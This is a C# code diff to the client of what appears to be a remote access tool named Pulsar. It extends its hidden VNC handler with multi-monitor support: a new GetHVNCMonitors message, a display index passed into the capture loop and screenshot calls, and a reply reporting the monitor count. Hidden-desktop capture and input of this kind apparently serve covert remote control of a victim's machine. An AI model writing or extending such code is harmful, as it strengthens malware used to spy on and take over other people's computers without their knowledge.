@@ -49,7 +49,7 @@ namespace Pulsar.Client.Messages
 
         public bool CanExecute(IMessage message)
         {
-            return message is GetHVNCDesktop || message is DoHVNCInput || message is StartHVNCProcess;
+            return message is GetHVNCDesktop || message is DoHVNCInput || message is StartHVNCProcess || message is GetHVNCMonitors;
         }
 
         public bool CanExecuteFrom(ISender sender)
@@ -69,6 +69,9 @@ namespace Pulsar.Client.Messages
                     break;
                 case StartHVNCProcess startHVNCProcess:
                     _ = ExecuteAsync(sender, startHVNCProcess);
+                    break;
+                case GetHVNCMonitors _:
+                    Execute(sender);
                     break;
             }
         }
@@ -118,7 +121,7 @@ namespace Pulsar.Client.Messages
             if (_captureThread == null || !_captureThread.IsAlive)
             {
                 _cancellationTokenSource = new CancellationTokenSource();
-                _captureThread = new Thread(() => BufferedCaptureLoop(_cancellationTokenSource.Token))
+                _captureThread = new Thread(() => BufferedCaptureLoop(_cancellationTokenSource.Token, message.DisplayIndex))
                 {
                     IsBackground = true,
                     Name = "HVNC Capture Loop"
@@ -165,7 +168,7 @@ namespace Pulsar.Client.Messages
             Interlocked.Exchange(ref _pendingFrameRequests, 0);
         }
 
-        private void BufferedCaptureLoop(CancellationToken cancellationToken)
+        private void BufferedCaptureLoop(CancellationToken cancellationToken, int displayIndex)
         {
             _stopwatch.Start();
 
@@ -183,7 +186,7 @@ namespace Pulsar.Client.Messages
                         continue;
                     }
 
-                    byte[] frameData = CaptureFrame();
+                    byte[] frameData = CaptureFrame(displayIndex);
                     if (frameData != null)
                     {
                         _frameBuffer.Enqueue(frameData);
@@ -209,11 +212,11 @@ namespace Pulsar.Client.Messages
             }
         }        
         
-        private byte[] CaptureFrame()
+        private byte[] CaptureFrame(int displayIndex)
         {
             try
             {
-                _desktop = ImageHandler.Screenshot();
+                _desktop = ImageHandler.Screenshot(displayIndex);
 
                 if (_desktop == null)
                 {
@@ -381,6 +384,13 @@ namespace Pulsar.Client.Messages
             {
                 Debug.WriteLine($"HVNC process start failed: {ex.Message}");
             }
+        }
+
+        private void Execute(ISender client)
+        {
+            int monitorCount = ImageHandler.GetMonitorCount();
+            Debug.WriteLine($"HVNC: Sending monitor count: {monitorCount}");
+            client.Send(new GetHVNCMonitorsResponse { Number = monitorCount });
         }
 
         public void Dispose()
